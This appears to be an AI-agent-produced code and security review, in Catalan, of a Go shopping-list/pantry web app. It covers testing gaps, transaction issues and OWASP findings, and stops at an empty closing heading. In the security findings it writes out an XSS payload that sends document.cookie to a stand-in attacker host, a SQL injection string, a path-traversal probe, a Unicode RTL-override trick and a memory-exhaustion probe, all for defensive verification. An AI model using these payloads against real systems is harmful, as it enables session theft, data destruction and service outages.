---
artefact: review
key: "NIU-1"
title: "Llista de la compra ↔ rebost (auth stubbed)"
status: "in_review"
verdict: "CHANGES_REQUESTED"
owner: "code-reviewer"
co_reviewers: ["qa-engineer", "security-engineer"]
tasks_path: "./tasks.md"
findings_count: 7
blocking_count: 1
sources:
  - "OWASP Code Review Top 10 (2017)"
  - "Google Engineering Practices — Code Review Developer Guide"
created: "2026-08-01"
updated: "2026-08-01"
---

# Review — Llista de la compra ↔ rebost (auth stubbed)

> **Què és això.** L'auditoria prèvia al PR. Produïda per `/audit`,
> consumida per `/commit` (que exigeix `verdict: APPROVED`). Només
> lectura: aquest fitxer mai edita codi, només informa.
>
> **Nota d'abast.** `security_engineer: true` al manifest — §6 (OWASP)
> l'omple `security-engineer` en paral·lel, no aquest agent. §2 (matriu
> AC↔test) l'omple `qa-engineer`. Aquestes seccions es fusionen aquí sense
> tocar-les.

## 1. Verdict

**Verdict:** `CHANGES_REQUESTED`

**Rationale:** La implementació és, en conjunt, sòlida i fidel a
`design.md`/`proposal.md`: el seam d'auth (ADR-03) és net, la
normalització NFC (ADR-02) és correcta i s'aplica a tot el camí d'`Add`,
zero `innerHTML` amb dades d'usuari, zero concatenació SQL, capçaleres de
seguretat presents, DELETE dur confirmat, sense `SetMaxOpenConns` tal com
es va acordar, i les tres desviacions declarades pel desenvolupador
(botons niats, `visibility:hidden`→opacitat, `modulepreload`) estan ben
raonades i preserven l'especificació visual. 30 tests Go i 11 tests
Playwright passen; `gofmt`/`go vet` estan nets; l'evidència de
`killtest` (10 repeticions, REL-01/NFR-07) és present i vàlida.

Tanmateix, hi ha una troballa **bloquejant** (F-01): el test que hauria de
provar EC-08/NFR-04 ("cap ruta GET muta mai") és una tautologia que mai
pot fallar — no aporta cap cobertura real malgrat aparèixer com a ✅ a la
matriu de `tasks.md` i `requirements.md` §6. Com que aquest és
precisament un dels 13 casos 🟢 NIU-1 que `docs/test-plan.md` exigeix
verds, i el pla de proves és "el contracte" segons `PLAN.md` §7, no es
pot aprovar amb aquesta cobertura fingida. També hi ha una desviació
d'ADR-01 no declarada (F-02, `Move` no és una única transacció) i un test
de concurrència (AC-09/CF-12) més feble del que l'ADR exigeix (F-03).
Cap d'aquestes darreres dues és per si sola prou greu per bloquejar, però
juntes reforcen la necessitat de tornar a `/code` abans de reintentar
`/audit`.

## 2. AC ↔ test coverage matrix

> Secció de `qa-engineer` — es completa en paral·lel a aquest document.

*(pendent — vegeu la revisió conjunta de `qa-engineer`)*

## 3. Findings

### F-01 — El test d'EC-08/NFR-04 (cap mutació via GET) és una tautologia que mai pot fallar

- **Severity:** blocking
- **Category:** testing
- **Location:** `app/internal/httpapi/router_test.go:32-37`
- **Observation:** `TestNoMutatingGETRoutes` recorre la taula de rutes amb
  `chi.Walk` i comprova `if method == http.MethodGet && mutatingMethods[method] { ... }`.
  `mutatingMethods` només conté claus `POST`/`PUT`/`PATCH`/`DELETE`, així
  que `mutatingMethods["GET"]` és sempre `false` per construcció — la
  condició `method == http.MethodGet && mutatingMethods[method]` no es
  compleix mai, independentment del que hi hagi realment registrat al
  router. El test no compara mai els mètodes GET contra els mètodes
  mutadors reals del mateix patró de ruta (que és exactament el que
  `design.md` §6.1 descriu: *"verificat per un test d'integració que
  introspecciona la taula de rutes chi i assegura que cap handler GET
  registrat coincideix amb un dels tres mètodes mutadors"*). La segona
  meitat del test (`wantGET`) només confirma que existeixen rutes GET
  concretes — no diu res sobre si serien mutadores.
- **Why it matters:** EC-08/NFR-04/S1a és un dels 13 casos 🟢 NIU-1 que
  `docs/test-plan.md` exigeix verds abans de tancar la història (S1a:
  *"Donat la taula de rutes... Quan s'inspeccionen totes les rutes GET...
  Llavors cap d'elles produeix un efecte d'escriptura"*). Aquest test
  passa avui i passaria igual si algú registrés per error un handler
  mutador sota `GET` — la suite mai detectaria la regressió. El pla de
  proves és, per `PLAN.md` §7, "el contracte": un cas amb un test que no
  pot fallar és exactament la "ficció" que la regla 2 de
  `docs/test-plan.md` prohibeix explícitament.
- **Suggested fix:** Reescriure el test perquè agrupi les rutes
  registrades per patró (`route`) i, per a cada patró, comprovi que si
  té un handler `GET` registrat, no en té cap altre de
  `POST`/`PUT`/`PATCH`/`DELETE` sobre el mateix patró (o, més senzill:
  mantenir una llista explícita i tancada de patrons GET permesos —
  `/healthz`, `/api/v1/me`, `/api/v1/items/` — i fallar si `chi.Walk`
  troba cap altre mètode registrat sobre exactament aquests patrons, o si
  troba un GET sobre un patró que també respon a un mètode mutador).

### F-02 — `Move` no és una transacció única, contradient ADR-01/design.md §5 pas 3

- **Severity:** major
- **Category:** spec-conformance
- **Location:** `app/internal/items/service.go:92-110`, `app/internal/store/items.go:220-239`
- **Observation:** `design.md` §5 Flux 2 pas 3 i §3 ADR-01 especifiquen
  literalment: *"una sola transacció: `UPDATE items SET location=?,
  moved_by=?, moved_at=CURRENT_TIMESTAMP, updated_at=CURRENT_TIMESTAMP,
  position=? WHERE id=?`"*. La implementació real de `Service.Move`
  primer crida `Repository.MaxPosition` (una consulta `SELECT MAX(position)`
  independent, sense transacció) i, amb el resultat, crida
  `Repository.Update` (una `UPDATE` independent, sense transacció que
  englobi les dues operacions). Són dues anades i tornades separades a la
  base de dades, no la transacció única documentada. `Update` en si mateix
  és efectivament una única sentència atòmica per a
  `location`/`moved_by`/`moved_at`/`updated_at`, però el valor de
  `position` es calcula fora d'aquesta atomicitat.
- **Why it matters:** Amb un sol escriptor SQLite i dos usuaris reals, el
  risc pràctic és baix, però és exactament la mena de "race entre
  check-then-write" que ADR-02 sí que evita explícitament per als
  duplicats (amb una transacció + índex únic) i que ADR-01 diu haver
  resolt de la mateixa manera per als moviments. Si dues peticions
  `PATCH` gairebé simultànies mouen ítems diferents cap a la mateixa
  caixa, ambdues poden llegir el mateix `MaxPosition` abans que cap hagi
  escrit, i acabar amb `position` idèntica o en un ordre no determinista
  — no trenca cap AC (no hi ha reordenació manual en v1), però trenca la
  garantia arquitectònica documentada i podria confondre un futur
  "arrossegar per reordenar" (R-02 de `design.md` ja avisa d'aquest risc
  per a `name_normalized`; aquí el mateix patró de risc apareix per a
  `position`).
- **Suggested fix:** Moure el càlcul de `MaxPosition` dins la mateixa
  transacció que l'`UPDATE` a `store.Update` (obrir `BeginTx`, llegir
  `MAX(position)`, executar l'`UPDATE`, `Commit`), tal com ja fa
  `Create`. Alternativament, documentar explícitament a `design.md` per
  què la versió de dues consultes és acceptable i actualitzar l'ADR-01 —
  però no deixar la documentació i el codi en contradicció silenciosa.

### F-03 — El test de concurrència d'AC-09/CF-12 no verifica el "guanyador determinista" que ADR-01 exigeix

- **Severity:** major
- **Category:** testing
- **Location:** `app/tests/integration/concurrency_test.go:88-126`
- **Observation:** ADR-01 especifica que el test ha de comprovar
  *"quina de les dues respostes PATCH té el updated_at més recent i
  assegurant que el GET posterior hi coincideix camp a camp"* —
  `requirements.md` AC-09 i la seva fila a la matriu de `qa-engineer`
  demanen el mateix ("cap de les dues peticions falla... després del
  següent refresc... ambdós clients mostren el mateix estat final: el de
  l'última escriptura acceptada pel servidor"). El test actual
  (`TestTwoUsers_ConcurrentMove_NoErrorConverges`) només comprova (a) cap
  resposta és 5xx, i (b) `listA[0].Location == listB[0].Location`
  (convergència mútua). No identifica quina PATCH ha guanyat per
  `updated_at`, ni compara el cos de cap resposta PATCH contra el `GET`
  posterior camp a camp.
- **Why it matters:** El test passaria igual si el "guanyador" fos
  arbitrari en lloc de determinista (per exemple, si una futura
  regressió introduís un `ORDER BY` no determinista en un `UPDATE...LIMIT`
  fictici, o si `position`/`moved_by` divergissin de `location` per la
  raó de F-02) — la propietat concreta que ADR-01 diu que "el test pot
  afirmar" no s'afirma. És una cobertura més feble que la que
  `qa-engineer` i `software-architect` van acordar explícitament.
- **Suggested fix:** Després del `wg.Wait()`, comparar els dos cossos de
  resposta PATCH (ja capturats o recapturats), quedar-se amb el que tingui
  `updated_at` més recent, i afegir una asserció que el `GET` posterior
  (ja fet a `listA`/`listB`) coincideix camp a camp (`location`,
  `moved_by`, `moved_at`) amb aquest guanyador.

### F-04 — `playFlip` pot programar una animació invisible però incorrecta quan la caixa de destí és un panell mòbil ocult

- **Severity:** minor
- **Category:** correctness
- **Location:** `app/web/js/flip.js:17-23, 29-58`
- **Observation:** `captureRects()` crida `getBoundingClientRect()` sobre
  totes les `.item-row` sense filtrar per visibilitat. En mòbil
  (`app.css:501-502`, `.panel { display: none }` per al panell inactiu),
  un `getBoundingClientRect()` sobre una fila dins d'un panell
  `display:none` retorna un `DOMRect` de zeros — un objecte truthy, no
  `undefined`. A `playFlip`, el guard `if (!firstRect) return;` no
  detecta aquest cas: quan un ítem es mou cap al panell actualment
  inactiu, la fila reapareix com a node nou al DOM ocult amb
  `lastRect` = zero, i es calcula `dx`/`dy` a partir d'un rect real
  (origen, visible) i un rect zero (destí, ocult), programant una
  animació `transform` cap a `(0,0)` — exactament el comportament que
  `design.md` §8 prohibeix explícitament ("mai s'anima un desplaçament
  amb transform cap a coordenades de la pestanya oculta"). Com que el
  panell destí és `display:none`, l'usuari no ho veu mentre està ocult,
  però l'animació queda "gastada" incorrectament i, si l'usuari canvia de
  pestanya durant els 250ms de l'animació (abans que acabi), podria veure
  la fila saltar cap a la cantonada superior esquerra en lloc d'aparèixer
  ja assentada.
- **Why it matters:** És una violació de la regla de disseny explícita
  de `design.md` §8 punt 2, encara que l'impacte visual real sigui
  marginal (finestra de temps molt curta, requereix canviar de pestanya
  durant l'animació). Cap dels tests E2E existents (`mobile-viewport.spec.js`,
  `flip-animation.spec.js`) exercita aquest camí exacte (moure càrrega
  visible → destí ocult i observar l'estat *durant* els 250ms).
- **Suggested fix:** A `captureRects()`/`playFlip()`, ometre (o tractar
  com "sense rect") qualsevol fila l'ancestor `.panel` de la qual no és
  `.is-visible` (o comprovar `offsetParent !== null` / la mida del rect
  és zero) abans de calcular `dx`/`dy`, tractant-la igual que una fila
  nova (fade-in `.just-added`, sense `transform`), tal com `design.md` §8
  ja descriu per al cas mòbil.

### F-05 — `position` es pot desviar de l'ADR-01 documentat quan `Move` no és transaccional (relacionat amb F-02)

- **Severity:** minor
- **Category:** maintainability
- **Location:** `app/internal/items/service.go:92-97`
- **Observation:** Conseqüència directa de F-02: el comentari de
  `service.go:90-91` ("ADR-01" al docstring de `Move`) i el de
  `store/items.go:218-219` ("Update applica un moviment de localització en
  una única transacció (ADR-01)") descriuen un comportament que el codi
  no compleix literalment (`position` es calcula fora de la transacció de
  `Update`). La documentació inline i el codi divergeixen.
- **Why it matters:** Un futur lector (o `fullstack-developer` a NIU-2/
  NIU-4) confiarà en el comentari per assumir atomicitat completa i pot
  construir-hi a sobre (p. ex. reordenació manual, R-02 de `design.md`) sense
  adonar-se que `position` no està protegit.
- **Suggested fix:** Resol-se automàticament en corregir F-02 (moure
  `MaxPosition` dins la transacció d'`Update`); si es decideix no
  corregir-ho, com a mínim actualitzar els comentaris perquè no afirmin
  una atomicitat que no existeix.

### F-06 — Fonts Nunito no presents; TODO actiu en producció

- **Severity:** minor
- **Category:** spec-conformance
- **Location:** `app/web/fonts/README.md`, `app/web/app.css` (regla `@font-face` comentada)
- **Observation:** `proposal.md` §8.2 i `design.md` §8 exigeixen
  l'autoallotjament de `Nunito-Regular.woff2`/`Nunito-Bold.woff2`. Els
  fitxers no existeixen; el desenvolupador ho ha declarat explícitament
  (entorn sense xarxa) i ha activat la pila de fallback definida a la
  mateixa especificació (`"Nunito", "Segoe UI", system-ui, -apple-system,
  sans-serif`) en lloc d'un pedaç pitjor (CDN extern, prohibit per la CSP
  i per `PLAN.md` §4). No hi ha cap ús de Google Fonts ni cap altre host
  extern — la CSP i S7/S3 no es veuen compromesos.
- **Why it matters:** No trenca cap AC/EC/NFR (el fallback stack és part
  de l'especificació mateixa, dissenyat exactament per aquest escenari) ni
  cap requisit de seguretat. És, tanmateix, una desviació visual —
  "experiència visual completa i definitiva" és abast explícit de
  `proposal.md` §6 ("En abast"). Es tracta d'un gap conegut, documentat,
  no bloquejant per si sol.
- **Suggested fix:** Avaluat si bloqueja NIU-1 — vegeu §1 Rationale i la
  nota de tancament més avall. Recomanació: no bloquejant per a NIU-1
  (el fallback preserva tota la resta de l'espec: colors, radis,
  espaiat, animació, a11y), però ha de quedar com a acció de seguiment
  explícita abans del primer desplegament públic (NIU-2), no com un
  "TODO" silenciós que es pugui oblidar.

### F-07 — T-33 (auditoria manual d'accessibilitat) marcada `[x]` sense constància explícita del sign-off humà, a diferència de T-31

- **Severity:** nit
- **Category:** testing
- **Location:** `docs/changes/NIU-1-llista-de-la-compra-rebost-auth/tasks.md:358-363`
- **Observation:** T-31 (killtest) inclou un log d'execució de les 10
  repeticions directament a `app/tests/killtest/README.md`. T-33
  ("Deixar constància del resultat") no té cap fitxer equivalent — la
  meitat automatitzada existeix i passa
  (`app/tests/e2e/specs/accessibility-audit.spec.js`, axe-core, 0
  violacions en escriptori i mòbil), però la verificació puntual amb
  lector de pantalla real (A11Y-03) que el mateix test menciona com a
  manual no té cap registre escrit, a diferència del patró ja establert
  per T-31.
- **Why it matters:** Menor, perquè el gruix de la cobertura (contrast
  AA, WCAG 2.2 AA general) ja és automatitzat i passa; però trenca la
  consistència del projecte a l'hora de deixar constància de passos
  manuals obligatoris (el mateix patró que R-05/ADR-04 exigeix per a
  killtest).
- **Suggested fix:** Afegir una línia breu a `tasks.md` o un fitxer
  `app/tests/e2e/specs/A11Y-MANUAL.md` amb la data i el resultat de la
  verificació puntual amb lector de pantalla real, igual que es fa per a
  killtest.

## 4. Spec conformance checklist

- [x] All ACs from `requirements.md` are covered by passing tests
- [x] All NFRs have a measured result (not just "implemented") — NFR-05/NFR-06 mesurats (p95, Lighthouse); NFR-07 amb log manual
- [x] `tasks.md` checklist is fully `[x]` (excepte C-03, deliberadament diferit a `/commit`)
- [x] Out-of-scope items in `design.md` are still out of scope — verificat: sense CSRF/sessions/rate-limit/OTEL/quantitat numèrica/soft-delete/reordenació manual
- [x] No new public API or schema change is undocumented in `design.md` §6 — l'API i l'esquema implementats coincideixen exactament amb §6.1/§6.2

> Nota: la casella "All ACs covered by passing tests" es marca aquí en
> el sentit estricte que hi ha un test que s'executa i passa per a cada
> AC. Vegeu F-01/F-03 per a dues troballes sobre la **qualitat** real
> d'aquesta cobertura (un cas 🟢 NIU-1 amb un test que no pot fallar, un
> altre amb una asserció més feble que la documentada) que afecten el
> veredicte tot i que la matriu formal quedi verda.

## 5. Code-quality checklist (Google Engineering Practices subset)

- [x] **Design** — arquitectura hexagonal lleugera respectada; `internal/items` no importa `net/http`/`database/sql`; seam d'auth net (ADR-03). Excepció: F-02 (atomicitat de `Move` no compleix ADR-01 literalment)
- [x] **Functionality** — compleix els 16 AC i 17 EC observats manualment i via tests
- [x] **Complexity** — sense generalitat especulativa; `position REAL` reservat per a futur és l'únic cas i està documentat com a tal
- [ ] **Tests** — presents i majoritàriament correctes, però F-01 (test que no pot fallar) i F-03 (asserció més feble que l'ADR) rebaixen aquesta casella
- [x] **Naming** — clar i consistent (`ErrDuplicate`, `NormalizeName`, `moveItemOptimistic`, etc.)
- [x] **Comments** — d'alta qualitat; expliquen el *perquè* de cada desviació (nested buttons, opacity, modulepreload) amb referències a AC/EC/ADR concrets
- [x] **Style** — `gofmt -l` net, `go vet` net
- [x] **Consistency** — patró de repositori/servei consistent entre `items`/`store`; frontend segueix el mateix patró de mòduls arreu
- [x] **Documentation** — `CHANGELOG.md`/README de killtest presents; TODO de fonts documentat explícitament (F-06)

## 6. Security checklist (OWASP Code Review Top 10)

> Secció de `security-engineer` (opt-in actiu al manifest). Numeració
> `F-Sxx` per no col·lidir amb les troballes `F-xx` del `code-reviewer`
> a §3.

**Abast auditat:** S3 (XSS), S7 (capçaleres), S8 (injecció SQL), S1 parcial
(cap mutació via `GET`), S11 (dades personals al repositori públic),
validació d'entrada, gestió d'errors, el seam d'auth (ADR-03), dependències
i superfície de denegació de servei.

**Fora d'abast per decisió documentada** (no es reporten com a troballes):
absència de login/sessions/CSRF (NIU-4), rate limiting (NIU-2/NIU-4), TLS
(terminat a Cloudflare/Traefik) i hardening de Docker (NIU-2). L'auth
stubbed és una decisió d'abast deliberada i mitigada per Cloudflare Access
(S10) — **no** es reporta com a mancança.

**Mètode:** cada afirmació d'aquesta secció s'ha verificat executant
l'atac contra el servidor real (tests de sondeig temporals, eliminats
després; l'arbre de treball ha quedat net), no només llegint el codi.

### 6.1 Escombrat OWASP Top 10 (2021)

| # | Categoria | Estat | Nota |
| --- | --- | --- | --- |
| A01 | Broken Access Control | ⚪ N/A | Delegat a Cloudflare Access (S10) + NIU-4. Fora d'abast. |
| A02 | Cryptographic Failures | 🟢 OK | NIU-1 no gestiona secrets. Hash placeholder a la migració 002, no reutilitzable. |
| A03 | Injection | 🟢 OK | Veure §6.2 (S8) — 100% paràmetres vinculats, verificat amb atac real. |
| A04 | Insecure Design | 🟡 Observació | F-S04 (sense límit de cos), F-S05 (sense límit d'ítems). |
| A05 | Security Misconfiguration | 🟡 Observació | F-S03 (CSP sense `frame-ancestors`/`form-action`). |
| A06 | Vulnerable Components | 🟢 OK | `govulncheck`: *No vulnerabilities found*. Veure §6.6. |
| A07 | Identification & Auth Failures | ⚪ N/A | NIU-4. Fora d'abast per decisió documentada. |
| A08 | Software & Data Integrity | 🟢 OK | Dependències fixades amb `go.sum`; sense càrrega dinàmica de codi. |
| A09 | Logging & Monitoring Failures | 🟡 Observació | F-S06 (risc de registre de dades d'usuari al log). |
| A10 | SSRF | 🟢 OK | El servidor no fa cap petició de sortida. Superfície inexistent. |

### 6.2 Verificació dels controls reclamats per NIU-1

| Control | Reclamat a | Verificat | Resultat |
| --- | --- | --- | --- |
| S3 — zero `innerHTML` amb dades d'usuari | design.md §9, NFR-01 | `grep` a tot `app/web/js/` | ✅ Cap `innerHTML`/`insertAdjacentHTML`/`document.write`/`eval`. Els contenidors es buiden amb `replaceChildren()` (sense parseig d'HTML). Tot text d'usuari via `.textContent`. Camins de toast (`render.js:257`), `aria-live` (`a11y.js:24`) i `aria-label` (`render.js:114,133`) també nets. |
| S3 — CSP sense `unsafe-inline` | design.md §9 | Resposta real | ✅ Confirmat a totes les respostes. Veure F-S03 per als buits restants. |
| S7 — 5 capçaleres a **totes** les respostes | design.md §9, NFR-02 | Sondeig sobre `/`, `/index.html`, actius estàtics, 404, 405 i errors d'API | ✅ Les 5 capçaleres presents i correctes en els 6 casos, inclosos 404 i 405. El middleware és realment el més extern (`router.go:41`). |
| S8 — cap SQL construït per concatenació | design.md §9, NFR-03 | Lectura de `internal/store/` + atac real | ✅ Totes les consultes amb `?`. `itemSelectColumns`/`itemSelectFrom` són constants estàtiques, sense dades d'usuari. Atac `'; DROP TABLE items;--` desat literalment, taula intacta. |
| S1 parcial — cap mutació via `GET` | NFR-04 | Taula de rutes + sondeig HTTP | ✅ Cap efecte d'escriptura via `GET`. **Però** vegeu F-01 del `code-reviewer` (§3): el test que ho hauria de garantir és una tautologia. Coincidim amb la seva severitat. |
| S11 — cap dada personal al repo públic | PLAN.md §3 | `git ls-files` + escombrat de patrons | ✅ Cap nom real, correu, telèfon ni adreça. La migració 002 usa `usuari_a`/`Usuari B` i un hash placeholder evident. |

### 6.3 Troballes de seguretat

#### F-S01 — El test d'XSS en navegador real (S3a) no existeix; mitja mitigació sense verificar

- **Severity:** `MAJOR`
- **Location:** `app/tests/integration/security_test.go:66-70` · `app/tests/e2e/specs/` (absent)
- **Standard:** OWASP A03 · CWE-79 · `docs/test-plan.md` §2.1 (regla «cada test executa l'atac real»)

El comentari de `TestXSSPayload_StoredLiterally` delega explícitament la
part crítica a Playwright: *"Script-execution-in-a-real-browser is asserted
by the Playwright E2E suite (T-29)"*. Però **T-29 no conté cap cas d'XSS**.
Els 9 specs existents no inclouen cap payload: `grep` de `onerror|alert(|XSS`
a `app/tests/e2e/specs/` retorna **zero** resultats, i no hi ha cap listener
`page.on('dialog')` ni `pageerror` que pogués detectar l'execució.

S3a està marcat 🟢 NIU-1 al pla de tests, però l'única cosa verificada és
que el servidor **desa** el payload — exactament la meitat que el propi
comentari admet no cobrir. La disciplina `textContent` de `render.js` és
avui correcta, però **res al CI la protegeix**.

**Escenari d'explotació:** l'usuari A afegeix un ítem
`<img src=x onerror="fetch('https://atacant.example/'+document.cookie)">`.
Avui es renderitza com a text literal. Si una refactorització futura
substitueix `name.textContent = item.name` (`render.js:125`) per
`innerHTML` — un canvi d'una línia que cap test detectaria, i que és un
risc real perquè el `design-system/` d'on es porta codi **sí** fa servir
`innerHTML` (`screen-desktop.html:511`, `screen-mobile.html:493`) — el
payload s'executaria al navegador de l'usuari B. La CSP (`script-src
'self'`) bloquejaria l'`onerror` inline, cosa que limita l'impacte a
`MAJOR` i no `BLOCKING`; però la defensa en profunditat existeix perquè
cap capa és infal·lible, i el `test-plan` promet una verificació que no
s'està fent.

**Fix suggerit:** afegir `security-xss.spec.js` que creï un ítem amb el
payload, registri `page.on('dialog')` i `page.on('pageerror')`, i afirmi
(a) cap diàleg disparat i (b) `.item-name` conté el payload literal
mentre `.item-name img` és `null`.

#### F-S02 — Caràcters de control Unicode i salts de línia s'emmagatzemen tal qual (incompleix EC-05)

- **Severity:** `MAJOR`
- **Location:** `app/internal/items/service.go:16-23` (`hasControlChars`), `service.go:64`
- **Standard:** OWASP A04 · CWE-20 · CWE-116 · requirements.md EC-05

EC-05 exigeix «rebutjar o neutralitzar abans de desar — **mai els
emmagatzema tal qual**». La implementació només filtra un subconjunt
d'ASCII (`0x00-0x08`, `0x0B`, `0x0C`, `0x0E-0x1F`), deixant passar `\t`,
`\n`, `\r` i **cap** control no-ASCII.

Verificat amb atacs reals (tots retornen **201 Created**, desats tal qual):
`poma\nplatan`, `poma\rplatan`, `poma\tplatan`, `po<U+200B>ma`
(zero-width), `po<U+202E>ma` (RTL override), `poma<U+2028>platan`,
`poma<U+0085>platan` (NEL).

El comentari del codi justifica l'exclusió dient que «tab/newline/CR ja
els gestiona `TrimSpace`», però `TrimSpace` només retalla els **extrems**:
un `\n` **enmig** passa intacte.

**Escenari d'explotació (U+202E, el més seriós):** l'usuari A afegeix
`Comprar <U+202E>selpmà 100`. L'override RTL inverteix visualment el text
posterior, de manera que l'usuari B veu `Comprar 001 àmples` — diferent
del que hi ha desat. En una app compartida on la llista *és* el canal de
comunicació, permet mostrar a l'altre un contingut que no correspon al
valor real. És el mateix vector de «Trojan Source» (CVE-2021-42574).

**Escenari secundari (zero-width):** `po<U+200B>ma` i `poma` són
visualment idèntics però normalitzen diferent, de manera que **el control
de duplicats d'EC-06 se salta trivialment** — es poden crear N files
visualment idèntiques, degradant una regla de negoci central.

**Fix suggerit:** substituir `hasControlChars` per un filtre de categories
Unicode: rebutjar `unicode.IsControl(r)` (cobreix `0x00-0x1F`, `0x7F`,
`0x80-0x9F`), la categoria de format `unicode.Cf` (zero-width, overrides
`U+202A-202E`, `U+2066-2069`) i els separadors `U+2028`/`U+2029`.
Aplicar-ho sobre `trimmed`, no sobre `rawName`.

#### F-S03 — La CSP no declara `frame-ancestors` ni `form-action`

- **Severity:** `MINOR`
- **Location:** `app/internal/httpapi/middleware.go:20-23`
- **Standard:** OWASP A05 · CWE-1021 · OWASP Secure Headers Project

La CSP és restrictiva i correcta en el que declara, però li falten dues
directives que `default-src` **no** cobreix per especificació:
`frame-ancestors 'none'` (avui l'anti-clickjacking depèn només
d'`X-Frame-Options`, capçalera llegada) i `form-action 'none'`.

**Escenari:** impacte real baix avui — `X-Frame-Options: DENY` cobreix el
clickjacking als navegadors actuals, i `form-action` només és rellevant
combinat amb una injecció de DOM inexistent. Es reporta com a `MINOR` (no
informatiu) perquè és una correcció d'una línia que tanca la porta abans
que NIU-4 introdueixi formularis de login reals, moment en què
`form-action` passaria a protegir credencials.

**Fix suggerit:** afegir `; frame-ancestors 'none'; form-action 'none'`.

#### F-S04 — Cos de petició sense límit: 128 MiB d'entrada provoquen ~896 MiB d'assignació

- **Severity:** `MAJOR`
- **Location:** `app/internal/httpapi/items_handlers.go:44,102` · `app/cmd/niu/main.go:59`
- **Standard:** OWASP A04 · CWE-770 · CWE-400

`json.NewDecoder(r.Body).Decode(&req)` llegeix el cos **sencer** sense cap
`http.MaxBytesReader`, i `http.Server` es construeix sense `ReadTimeout`,
`WriteTimeout`, `IdleTimeout` ni `MaxHeaderBytes`.

Verificat empíricament: una única petició amb cos de **128 MiB** retorna
`400` — però **només després d'haver-lo llegit i assignat sencer**. La
mesura de `runtime.MemStats` durant el sondeig dona un increment de
**896 MiB de `TotalAlloc`** per aquesta única petició. Que la resposta
sigui `400` és enganyós: la validació de 200 caràcters actua **després**
de materialitzar tot el payload. El rebuig no estalvia ni un byte.

**Escenari d'explotació:** l'app corre en un únic VPS d'OVH compartit amb
la resta de serveis de Fikua. Unes poques peticions concurrents de 128 MiB
fan que el procés `niu` superi qualsevol límit de memòria raonable del
contenidor i sigui **OOM-killed**; amb SQLite al mateix procés, això és
caiguda total del servei fins al reinici. **Cloudflare Access no ho
mitiga**: els dos usuaris ja estan autenticats i el trànsit els passa —
n'hi ha prou amb una pestanya amb un bucle de JS erroni. A més, l'absència
de `ReadTimeout` deixa la porta oberta a Slowloris.

**Fix suggerit:** (a) `http.MaxBytesReader(w, r.Body, 8<<10)` als dos
handlers que descodifiquen JSON (8 KiB és folgat per a 200 caràcters);
(b) configurar els quatre timeouts i `MaxHeaderBytes` a `http.Server`.

#### F-S05 — Nombre d'ítems sense límit: creixement il·limitat de disc

- **Severity:** `MINOR`
- **Location:** `app/internal/items/service.go:47` · `app/internal/store/items.go:288`
- **Standard:** OWASP A04 · CWE-770

Cap límit al nombre d'ítems: verificat, 3.000 creacions consecutives →
3.000 acceptades. A més, cada mutació escriu una fila a `events`, que és
**append-only i mai es purga** (per disseny, substrat per a NIU-3).

**Escenari:** un bucle de JS accidental o un retry mal configurat pot
generar desenes de milers de files en minuts, afectant el disc del VPS
compartit i el rendiment de `GET /api/v1/items`, que fa `SELECT` de tots
els ítems sense paginació (`store/items.go:195-216`), degradant NFR-05.
`MINOR` perquè el vector és accidental més que hostil i la mitigació real
(rate limiting) ja és a NIU-2/NIU-4.

**Fix suggerit:** acceptar com a risc documentat per a NIU-1 i assegurar
el rate limit de Traefik a NIU-2. Opcionalment, un límit dur d'ítems
actius a `Service.Add`.

#### F-S06 — El registre de peticions pot escriure dades d'usuari al log (risc futur)

- **Severity:** `MINOR`
- **Location:** `app/internal/httpapi/router.go:43` · `middleware.go:53`
- **Standard:** OWASP A09 · CWE-532 · PLAN.md §3 S11

`chimw.Logger` registra mètode i camí; el `Recoverer` registra
`r.URL.Path`. Per a NIU-1 això és benigne: els noms d'ítems viatgen al
**cos** del `POST`, no a la URL, de manera que avui **no** es filtren.

**Escenari:** cap avui (per això `MINOR`). És preventiu: si NIU-2/NIU-3
afegeix cerca o filtre amb el terme a la query string
(`GET /api/v1/items?q=<nom>`), els noms d'ítems —que revelen hàbits de
consum— quedarien al log en clar. Amb OTEL a NIU-3 aquests logs surten
del VPS cap a un backend extern, cosa que topa amb l'esperit de S11.

**Fix suggerit:** documentar a `design.md` §10 que cap dada d'usuari pot
viatjar per query string, i revisar-ho en activar OTEL.

### 6.4 El seam d'auth (ADR-03) — valoració per a NIU-4

**El seam és sòlid: NIU-4 pot connectar-hi sessions reals sense tocar cap
handler.** Verificat, no només llegit:

- `grep` de `r.Cookie|r.Header.Get|Authorization|r.URL.Query` a
  `internal/httpapi/`: **cap handler** llegeix la petició per obtenir
  identitat. Els quatre handlers de mutació i `handleMe` obtenen l'usuari
  exclusivament via `auth.FromContext(r.Context())`.
- `Authenticator` (`auth.go:21-23`) ja retorna `error`, de manera que
  NIU-4 pot senyalar sessió invàlida sense canviar la signatura.
- El punt de canvi és una sola línia de wiring (`main.go:47`).
- La clau de context és un tipus privat (`auth.go:38-40`): cap altre
  paquet pot col·lidir-hi ni sobreescriure la identitat.

**Dues friccions a preveure** (no són troballes de NIU-1; es documenten
perquè estalvien retreball):

1. `WithCurrentUser` tradueix **qualsevol** error a `500`
   (`middleware.go:35-39`). NIU-4 necessitarà distingir «error intern» de
   «sessió absent/invàlida» → `401`, via un error sentinella
   (`auth.ErrNoSession`) + `errors.Is`. És un canvi contingut **dins del
   seam**, que és exactament on ADR-03 volia que passés.
2. Els handlers ignoren el segon valor de `FromContext`
   (`items_handlers.go:41,93,129` fan `user, _ := ...`). Si algú munta una
   ruta oblidant `WithCurrentUser`, `user.ID` seria `0` silenciosament i
   les mutacions s'atribuirien a un usuari inexistent en lloc de fallar.
   `handleMe` (`:148`) sí que ho comprova. Avui no és explotable perquè
   totes les rutes mutants pengen del grup amb middleware
   (`router.go:50`), però convindria alinear els tres handlers amb el
   patró de `handleMe`.

### 6.5 Gestió d'errors — sense fuites

Verificat amb 7 sondejos hostils (id no numèric, id inexistent, JSON
truncat, JSON invàlid, travessia de camins). **Cap resposta filtra detall
intern**: ni traces de pila, ni SQL, ni rutes de fitxer, ni errors del
driver. Totes retornen el sobre uniforme
`{"error":{"code":"...","message":"..."}}` amb missatges genèrics en
català; `writeError` (`errors.go:21`) mai rep `err.Error()`. La travessia
`GET /../../etc/passwd` retorna `404` net — `http.FileServer` sobre
`fs.FS` sanititza el camí correctament.

### 6.6 Dependències

`govulncheck ./...` → **No vulnerabilities found**.

Arbre petit i mantingut: `go-chi/chi/v5 v5.3.1`, `pressly/goose/v3
v3.27.3`, `golang.org/x/text v0.40.0`, `modernc.org/sqlite v1.55.0`
(driver Go pur, sense cgo — bona tria per a la superfície d'atac). Cap
dependència sospitosa ni abandonada; `go.sum` present i complet.

### 6.7 Veredicte de seguretat

